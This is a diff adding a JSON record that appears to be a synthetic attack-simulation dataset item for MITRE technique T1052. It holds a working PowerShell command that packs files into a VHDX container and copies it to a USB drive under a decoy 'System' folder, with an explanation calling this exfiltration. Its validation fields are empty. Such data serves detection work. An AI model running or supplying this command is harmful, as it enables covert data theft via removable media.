@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$tmp=\"C:\\Temp\\pack.vhdx\"; New-VHD -Path $tmp -SizeBytes 1073741824 -Dynamic | Out-Null; Mount-DiskImage -ImagePath $tmp; $v=(Get-DiskImage $tmp | Get-Disk | Get-Partition | Where-Object DriveLetter | Get-Volume | Select-Object -First 1 -ExpandProperty DriveLetter); Format-Volume -DriveLetter $v -FileSystem NTFS -Force -Confirm:$false | Out-Null; Copy-Item \"C:\\Users\\Public\\Videos\\*\" \"$v:\\\" -Recurse -Force; Dismount-DiskImage -ImagePath $tmp; $usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path \"$usb:\\System\" -ItemType Directory -Force | Out-Null; Copy-Item $tmp \"$usb:\\System\\drvs.vhdx\" -Force",
+  "explanation": "Packs data into a VHDX container locally, then copies that container file to a USB device to consolidate exfil data into a single file on removable media.",
+  "rationale_steps": [
+    "Create and mount a temporary VHDX image.",
+    "Format and load it with target data.",
+    "Dismount and move the VHDX onto the USB in a plausible directory."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-5deae7ec",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
